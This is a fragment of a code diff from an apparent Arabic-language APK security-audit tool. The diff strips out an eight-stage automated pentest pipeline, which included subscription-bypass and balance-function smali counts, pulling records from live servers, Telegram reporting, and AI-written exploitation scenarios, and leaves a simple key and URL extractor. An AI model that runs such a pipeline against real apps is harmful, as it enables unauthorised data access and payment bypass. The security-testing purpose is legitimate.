+            if 'AIza' in line: self.results['secrets'].append(line.strip())
+            if 'http' in line: self.results['endpoints'].append(line.strip())
+    
+    def run(self):
+        print(f"[*] Analyzing {self.path}...")
+        self.extract_strings()
+        print(json.dumps(self.results, indent=2))
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="HAYO AI APK Security Audit")
-    parser.add_argument("input", help="APK file path or URL")
-    parser.add_argument("--bot-token", help="Telegram Bot Token", default=None)
-    parser.add_argument("--chat-id", help="Telegram Chat ID", default=None)
-    args = parser.parse_args()
-    apk_path = args.input
-    if apk_path.startswith("http"):
-        log("تحميل APK من الرابط...")
-        r = requests.get(apk_path)
-        apk_path = "target.apk"
-        with open(apk_path, "wb") as f: f.write(r.content)
-    APKPentest(apk_path, args.bot_token, args.chat_id).run_all()`;
+    p = argparse.ArgumentParser()
+    p.add_argument("input")
+    args = p.parse_args()
+    APKPentest(args.input).run()`;
 
   const step8Findings: string[] = [
-    `📊 ═══ ملخص التقرير النهائي ═══`,
-    ``,
     `📊 درجة الخطورة: ${riskScore}/100`,
-    `🔴 خطوات حرجة: ${criticalCount}`,
-    `🟡 تحذيرات: ${warningCount}`,
     `🔑 مفاتيح مستخرجة: ${allKeys.length}`,
-    `🌐 نقاط دخول API: ${apiEndpoints.size}`,
-    `☁️ مزودون سحابيون: ${[...allProviders].join(", ") || "لا يوجد"}`,
-    ``,
-    `📋 ═══ الثغرات المكتشفة فعلياً ═══`,
-    `  • ${allKeys.length} مفتاح/توكن مخزن في الكود المصدري`,
-    `  • ${apiEndpoints.size} نقطة API مكشوفة في الكود`,
-    `  • ${relativeApiPaths.size} مسار API مكتشف من smali`,
-    `  • ${premiumSmali.length} ملف smali يحتوي على دوال الاشتراك (قابل للتعديل)`,
-    `  • ${balanceSmali.length} ملف smali يحتوي على دوال الرصيد/التحويل`,
-    `  • ${firebaseUrls.length} Firebase URL مكتشف`,
-    `  • ${successfulHits.length} endpoint أجاب بدون مصادقة`,
-    `  • ${totalPulled} سجل تم سحبه فعلياً من السيرفر الحقيقي`,
-    ``,
-    `📡 ═══ نتائج فحص السيرفر الحقيقي (${baseApiUrl}) ═══`,
-    ``,
-    wafDetected ? `  🛡️ WAF مكتشف — السيرفر يحجب الاتصال من خارج البلد` : `  ✅ السيرفر متاح للاتصال`,
-    `  ✅ Endpoints ناجحة: ${successfulHits.length}`,
-    `  🔒 تحتاج مصادقة: ${authRequired.length}`,
-    `  🛡️ محجوبة بـ WAF: ${forbiddenByWaf.length}`,
-    ``,
-    `  📊 ما تم اكتشافه من الكود (ثابت بغض النظر عن الحماية):`,
-    `    → ${apiEndpoints.size} URL في الكود المصدري`,
-    `    → ${allKeys.length} مفتاح/توكن مكشوف`,
-    `    → ${premiumSmali.length} ملف smali قابل لتجاوز الاشتراك`,
-    `    → ${relativeApiPaths.size} مسار API مكتشف من smali`,
-    ``,
-    `🛡️ ═══ توصيات الإصلاح العاجلة ═══`,
-    `  1. التحقق من الصلاحيات على مستوى السيرفر (Server-Side Authorization)`,
-    `  2. استخدام Firebase Security Rules لمنع الوصول غير المصرح`,
-    `  3. تدوير المفاتيح المكشوفة فوراً (Rotate Exposed Keys)`,
-    `  4. إضافة Rate Limiting لمنع هجمات التعداد (Enumeration)`,
-    `  5. استخدام EncryptedSharedPreferences بدل SharedPreferences`,
-    `  6. تفعيل ProGuard/R8 لتشويش الكود (Code Obfuscation)`,
-    `  7. إضافة Certificate Pinning لمنع MITM`,
-    `  8. عدم تخزين JWT Tokens في الكود المصدري`,
-    `  9. إجراء اختبار اختراق دوري + Code Review + SAST/DAST`,
-    `  10. فصل مفاتيح الإنتاج عن مفاتيح التطوير`,
-    ``,
-    `⚙️ ═══ السكريبت المتكامل (Python) ═══`,
-    `  → python3 pentest_auto.py <path_to_apk> --bot-token TOKEN --chat-id ID`,
-    `  → 8 مراحل تلقائية: تفكيك → WAF → مفاتيح → IDOR → استغلال → DB → Telegram → تقرير`,
-    `  → يعمل على Kali Linux / Ubuntu مع تثبيت الأدوات تلقائياً`,
+    `🌐 نقاط API: ${apiEndpoints.size}`,
+    `☁️ مزودون: ${[...allProviders].join(", ") || "لا يوجد"}`,
   ];
 
   steps.push({
     id: 8,
-    title: "السكريبت المتكامل + التقرير النهائي والتوصيات",
+    title: "السكريبت المتكامل + التقرير النهائي",
     status: riskScore > 60 ? "critical" : riskScore > 30 ? "warning" : "info",
     findings: step8Findings,
     commands: [],
-    details: `تقرير شامل: ${totalFindings} اكتشاف · درجة الخطورة ${riskScore}/100 · سكريبت Python متكامل`,
+    details: `تقرير شامل: ${totalFindings} اكتشاف`,
     pythonScript,
   });
 
+  // AI Report Generation
   let aiReport = "";
   try {
-    const aiSummary = `حلل نتائج اختبار الاختراق التالية لتطبيق APK وأعطِ تقريراً احترافياً مفصلاً بالعربية:
-مزودون سحابيون: ${[...allProviders].join(", ")}
-مفاتيح مستخرجة: ${allKeys.length}
-نقاط دخول API: ${apiEndpoints.size}
-Firebase URLs: ${firebaseUrls.join(", ")}
-ثغرات SQL: ${sqliVulnerable.length}
-درجة الخطورة: ${riskScore}/100
-
-النتائج التفصيلية:
-${steps.map(s => `\nالخطوة ${s.id}: ${s.title}\n${s.findings.slice(0, 10).join("\n")}`).join("\n")}
-
-قدّم:
-1. ملخص تنفيذي
-2. تفصيل الثغرات المكتشفة مع مستوى الخطورة
-3. سيناريوهات الاستغلال المحتملة
-4. توصيات الإصلاح العاجلة
-5. خطة الحماية المقترحة`;
-
+    const aiSummary = `قدم تقرير اختبار اختراق احترافي بالعربية لملف ${fileType.toUpperCase()}.
+النتائج: ${allKeys.length} مفتاح، ${apiEndpoints.size} نقطة API، ${allProviders.size} مزود سحابي. درجة الخطورة ${riskScore}/100.`;
     const { content } = await callPowerAI(
-      "أنت خبير أمن سيبراني متخصص في اختبار الاختراق. قدّم تقرير اختبار اختراق احترافي بالعربية.",
+      "أنت خبير أمن سيبراني. قدم تقريراً احترافياً بالعربية.",
       aiSummary,
-      8192
+      4000
     );
     aiReport = content;
-  } catch (e: any) {
-    aiReport = `# تقرير اختبار الاختراق\n\nدرجة الخطورة: ${riskScore}/100\nمزودون سحابيون: ${[...allProviders].join(", ")}\nمفاتيح مستخرجة: ${allKeys.length}\nنقاط دخول: ${apiEndpoints.size}\n\n${e.message}`;
+  } catch {
+    aiReport = `# تقرير اختبار الاختراق\n\nدرجة الخطورة: ${riskScore}/100\nمفاتيح: ${allKeys.length}\nنقاط API: ${apiEndpoints.size}`;
   }
 
   return {
@@ -6940,7 +6146,7 @@ ${steps.map(s => `\nالخطوة ${s.id}: ${s.title}\n${s.findings.slice(0, 10).
       lowCount: 0,
       riskScore,
       cloudProviders: [...allProviders],
-      extractedEndpoints: [...allEndpoints, ...[...apiEndpoints]].slice(0, 100),
+      extractedEndpoints: [...apiEndpoints].slice(0, 100),
       extractedKeys: allKeys.slice(0, 20),
       vulnerableApis,
     },
